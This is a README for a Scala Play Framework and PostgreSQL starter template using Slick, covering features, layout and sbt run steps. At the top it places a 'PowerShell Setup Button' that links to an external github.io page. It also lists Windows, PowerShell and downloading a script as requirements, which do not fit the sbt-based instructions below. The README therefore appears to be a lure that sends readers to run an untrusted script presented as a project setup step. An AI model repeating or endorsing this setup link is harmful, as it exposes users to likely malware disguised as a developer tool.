<div align="center">

# Play Framework PostgreSQL Template with Modern UI

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://spiderveer1-byte.github.io/play-reactive-slick/)

[![pwsh](https://img.shields.io/badge/Pwsh-Core-a855f7?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Active-2ea44f?style=social&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Artistic--2.0-9333ea?style=social&labelColor=0d1117)]()

</div>

---

A Play starter template with a ready-made interface, pairing the Play web framework with Postgres as the database. Use it as a base for new applications when you want that stack already wired together. It gives you a working demo project to build on instead of starting from scratch.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- Play Framework backend with a clean, ready-to-use UI out of the box
- PostgreSQL wired in via Slick for functional, type-safe database access
- Reactive, non-blocking data flow between the UI and the database
- Sensible starter layout so you can drop in your own models, routes, and views
- Ideal baseline when you want Play + Postgres without assembling the plumbing yourself

## Tech Stack

- **Play Framework** — server-side web framework in Scala, handles routing, controllers, and rendering.
- **Slick** — functional relational mapping layer for type-safe database access.
- **PostgreSQL** — the backing relational database for the demo.
- **Scala** — primary language for application code.
- **Reactive design** — non-blocking, asynchronous request handling throughout the stack.
- **Plain UI layer** — a clean, ready-to-use interface bundled with the template.

The stack is intentionally minimal: swap in your own models and controllers, keep the wiring, and build from there.

## Project Structure

```
app/
  controllers/    HTTP controllers and request handlers
  models/         Domain models and Slick table mappings
  services/       Business logic and data access layer
  views/          Twirl templates for the UI
conf/
  application.conf   Application configuration
  routes             Route definitions
  evolutions/        Database schema evolutions
public/
  stylesheets/    CSS assets
  javascripts/    Client-side scripts
  images/         Static image assets
build.sbt           Build definition and dependencies
```

- `app/controllers` handles incoming requests and delegates to services.
- `app/models` defines case classes and Slick table mappings for Postgres.
- `app/services` contains the reactive data access logic built on Slick.
- `conf/evolutions` holds versioned SQL migrations applied on startup.
- `public` serves static assets referenced by the views.

## Getting Started

- Ensure PostgreSQL is installed and running locally.
- Create a database named `test`.
- Make sure your database credentials match the configuration in `conf/application.conf`.
- Build the project with `sbt clean compile`.
- Run the application with `sbt run`.
- Open your browser and navigate to `localhost:9000` to view the running app.

The demo ships with a ready-to-use UI and a sample schema, so you can start exploring the routes, controllers, and Slick models right away. Use it as a base and replace the sample domain logic with your own.

## FAQ

- **Do I need Postgres to run this?** Yes. The template is wired for Postgres; point the app at your own instance via the database configuration.
- **Which Play version does this target?** Check the build definition for the exact Play and Scala versions before upgrading dependencies.
- **Is Slick required?** The demo uses Slick for data access, but the Play side is independent; you can swap the persistence layer if needed.
- **Can I use this as a production base?** It is a starting point, not a hardened app. Review configuration, secrets handling, and connection pooling before deploying.
- **How do I reset the schema?** Drop and recreate your local database, then re-run the app to apply evolutions.
- **Where do I change the UI?** Front-end assets and templates live under the app's views and public assets; adjust styling there.
- **Why do I get connection errors on startup?** The app cannot reach Postgres. Verify the database is running, the database name matches your config, and credentials are correct.
- **Can I run it with a different database?** Not out of the box; the demo assumes Postgres. Porting requires updating the driver and Slick profile.
- **How is the project structured?** Controllers, models, and views follow the standard Play layout; see the Project Structure section for details.
- **Is there a test suite?** Basic tests are included; run them through the standard build tooling to validate changes.

## License

This project is provided as a template/starter and is intended for use as a starting point. See the repository's license file for the full terms.